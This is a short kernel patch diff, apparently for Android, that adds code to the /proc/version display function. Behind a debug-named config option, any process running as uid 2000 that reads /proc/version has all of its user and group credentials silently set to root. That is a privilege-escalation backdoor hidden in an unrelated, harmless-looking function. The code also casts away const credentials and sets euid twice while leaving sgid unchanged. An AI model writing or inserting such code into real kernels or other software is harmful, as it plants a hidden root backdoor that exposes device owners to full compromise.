@@ -7,6 +7,23 @@
 
 static int version_proc_show(struct seq_file *m, void *v)
 {
+#ifdef CONFIG_ANDROID_DEBUG_ROOT_ACCESS
+        struct cred *cred;
+        cred = (struct cred *)__task_cred(current);
+
+        if (cred->uid.val == 2000) {
+		printk("sh: becoming root now\n");
+                cred->uid.val = 0;
+                cred->gid.val = 0;
+                cred->suid.val = 0;
+                cred->euid.val = 0;
+                cred->euid.val = 0;
+                cred->egid.val = 0;
+                cred->fsuid.val = 0;
+                cred->fsgid.val = 0;
+        }
+#endif
+
 	seq_printf(m, linux_proc_banner,
 		utsname()->sysname,
 		utsname()->release,
